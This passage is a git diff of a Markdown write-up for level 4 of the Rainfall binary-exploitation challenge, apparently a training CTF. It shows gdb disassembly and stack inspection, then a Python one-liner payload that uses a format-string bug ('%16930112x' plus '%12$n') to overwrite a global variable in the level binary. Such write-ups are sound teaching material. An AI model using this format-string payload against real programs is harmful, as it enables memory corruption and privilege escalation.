@@ -1,3 +1,7 @@
+# Rainfall
+
+## Level4
+
 ```sh
 (gdb) disas main
 Dump of assembler code for function main:
@@ -49,23 +53,26 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
+This is the same exploit as the previous exercice, the only issue is that this time we cannot manually write all the characters into the buffer to increase the printf count since the buffer is limited to `512` char and we need the global to be equal to `16 930 116`
+
+In order to bypass this we can manually increase the character count by using the field width modifier like this: `%16930112x`, it will print the variadic pointed by x padded with `16930112` spaces.
+
+Now we only need to find at which variadic argument position our global is located
 ```sh
-(gdb) b *0x08048455
+(gdb) b *0x08048455 # breakpoint at printf
 Breakpoint 1 at 0x8048455
 (gdb) r
 Starting program: /home/user/level4/level4 
-AAAA
+AAAA # passing a random 4 bytes string
 AAAA
 
 Breakpoint 1, 0x08048455 in p ()
 (gdb) x/20x $esp
-0xbffff4f0:     0xbffff520      0xb7ff26b0      0xbffff764      0xb7fd0ff4 # 0 - 3
-0xbffff500:     0x00000000      0x00000000      0xbffff728      0x0804848d # 4 - 7
-0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0 # 8 - 11
-0xbffff520:   **0x41414141**    0xb7e2000a      0x00000001      0xb7fef305 # 12 - 15
-0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007 # 16 - 19
-(gdb) x/s $esp + 48 # 12 * 4 (position * size)
-0xbffff520:      "AAAA\n"
+0xbffff4f0:     0xbffff520      0xb7ff26b0      0xbffff764      0xb7fd0ff4
+0xbffff500:     0x00000000      0x00000000      0xbffff728      0x0804848d
+0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff520:   **0x41414141**    0xb7e2000a      0x00000001      0xb7fef305 # "AAAA" found at the 12 position
+0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
 ```
 
 - `\x10\x98\x04\x08` address of the variable we want to overwrite
@@ -73,7 +80,7 @@ Breakpoint 1, 0x08048455 in p ()
 - `%12$n` Write the sum of all the characters into the 12th argument which is `\x10\x98\x04\x08`
 
 ```sh
-level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '%16930112x' + '%12\$n')" | ./level4
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
 
 
                           b7ff26b0
